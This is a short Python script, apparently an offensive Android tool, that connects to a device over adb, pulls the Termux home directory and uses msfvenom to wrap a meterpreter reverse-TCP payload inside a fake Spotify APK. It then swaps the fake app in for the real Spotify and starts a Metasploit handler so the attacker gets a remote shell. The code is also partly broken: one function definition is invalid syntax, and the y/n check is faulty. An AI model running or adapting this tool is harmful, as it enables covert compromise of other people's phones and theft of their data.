import os
import sys
import socket
import requests
import time
from termcolor import colored
import get_ip as ad
def msf():
    print(colored("[*]creating virus","blue"))
    os.system("msfvenom -p android/meterpreter/reverse_tcp -x spotify.apk LHOST=%s LPORT=4444 -f java -o false_spotify.apk" % ad.get(socket.gethostname()))
    print(colored("[*]connecting to msf","blue"))


def andro(str(ip)):
    try:
        print(colored("[*]connecting to %s" % ip, "blue"))
        os.system(" adb connect %s" % ip)
        print(colored("[+]connected to %s" % ip, "green"))
        time.sleep(1)
        print(colored("[*]pulling termux files","blue"))
        os.system(" adb pull /data/data/com.termux/files/home/")
        print(colored("[+]pulled termux files","green"))
        time.sleep(1)
        msf()
        print(colored("do you want to install a reverse shell? (y/n)\n", "blue"))
        
        choice = input()
        if choice == "y":
            os.system(" adb uninstall com.spotify.music")
            os.system(" adb install false_spotify.apk")
            print(colored("[+]]installed false_spotify","green"))
            os.system("msfconsole -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST %s; set LPORT 4444; set ExitOnSession false; exploit;' " % ad.get(socket.gethostname()))
            print(colored("[+]connected to msf","green"))
            print(colored("[+]executing false_spotify","green"))
            os.system(" adb shell am start -n com.spotify.music/com.spotify.music.MainActivity")
            print(colored("[+]executing msf","green"))
        if choice == "n":
            print(colored("[-]exiting","red"))
            
        else:
            print(colored("[-]invalid choice","red"))
        
    except:
        print(colored("[-]failed to connect to %s" % ip, "red"))

    